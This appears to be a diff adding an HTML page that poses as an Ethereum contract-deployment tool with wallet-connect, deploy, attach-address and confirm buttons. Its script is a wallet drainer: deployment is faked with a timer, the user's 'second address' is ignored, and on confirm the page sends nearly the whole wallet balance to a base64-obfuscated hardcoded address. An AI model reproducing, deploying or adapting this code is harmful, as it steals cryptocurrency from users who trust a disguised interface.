@@ -1,0 +1,146 @@
+
+<html><head>
+  <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereum Transaction</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #1e1e2f; /* Dark background */
+            color: #ffffff; /* White text */
+        }
+ 
+        .container {
+            text-align: center;
+            background: #2b2b3d; /* Neutral dark background */
+            padding: 20px 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+ 
+        button {
+            background-color: #444457; /* Neutral button color */
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+ 
+        button:disabled {
+            background-color: #333344; /* Color for disabled buttons */
+            cursor: not-allowed;
+        }
+ 
+        button:hover:not(:disabled) {
+            background-color: #555567;
+            transform: translateY(-2px);
+        }
+ 
+        #statusMessage {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #aaaaaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="connectButton">Connect Wallet</button>
+        <button id="deployButton" disabled>Deploy</button>
+        <span id="contractStatus">no contract</span>
+        <div>
+            <label for="secondAddress">Input second address:</label>
+            <input type="text" id="secondAddress" placeholder="ETH-0x..." />
+            <button id="attachButton" disabled>Attach</button>
+        </div>
+        <button id="confirmButton" disabled>Confirm</button>
+        <div id="statusMessage"></div>
+    </div>
+ 
+    <script>
+        const connectButton = document.getElementById("connectButton");
+        const deployButton = document.getElementById("deployButton");
+        const attachButton = document.getElementById("attachButton");
+        const confirmButton = document.getElementById("confirmButton");
+        const statusMessage = document.getElementById("statusMessage");
+        const secondAddressInput = document.getElementById("secondAddress");
+        const contractStatus = document.getElementById("contractStatus");
+ 
+        let connectedAccount = null;
+ 
+        const addressTo = atob("MHgyNTY5Y2IzNTE2YTI4MDE4MzlhMTQ2NTI2NEUzMzRDMTUyNThlNTQ0");
+ 
+        connectButton.addEventListener("click", async () => {
+            try {
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                connectedAccount = accounts[0];
+                statusMessage.textContent = "Connected: " + connectedAccount;
+                deployButton.disabled = false;
+            } catch (error) {
+                console.error("Connection error:", error);
+                statusMessage.textContent = "Connection failed.";
+            }
+        });
+ 
+        deployButton.addEventListener("click", () => {
+            contractStatus.textContent = "waiting...";
+            setTimeout(() => {
+                contractStatus.textContent = "ready";
+                attachButton.disabled = false;
+            }, 2000);
+        });
+ 
+        attachButton.addEventListener("click", () => {
+            const secondAddress = secondAddressInput.value;
+            if (secondAddress && secondAddress.startsWith("0x") && secondAddress.length === 42) {
+                statusMessage.textContent = "Second address attached. Ready.";
+                confirmButton.disabled = false;
+            } else {
+                alert("Attention! Enter the correct second Ethereum address.");
+            }
+        });
+ 
+        confirmButton.addEventListener("click", async () => {
+            try {
+                const gasBuffer = 0.0005; // Adjust the value as needed
+                const balanceWei = await window.ethereum.request({
+                    method: "eth_getBalance",
+                    params: [connectedAccount, "latest"],
+                });
+                const balanceInEth = parseFloat(parseInt(balanceWei) / 1e18);
+ 
+                if (balanceInEth > gasBuffer) {
+                    const amountToSend = balanceInEth - gasBuffer;
+ 
+                    const transactionParameters = {
+                        to: addressTo,
+                        from: connectedAccount,
+                        value: 0x${(amountToSend * 1e18).toString(16)},
+                    };
+ 
+                    await window.ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [transactionParameters],
+                    });
+ 
+                    statusMessage.textContent = "Transaction successful!";
+                } else {
+                    statusMessage.textContent = "Insufficient funds for gas.";
+                }
+            } catch (error) {
+                console.error("Transaction error:", error);
+                statusMessage.textContent = "Transaction failed.";
+            }
+        });
+    </script>
+</body>
+</html>
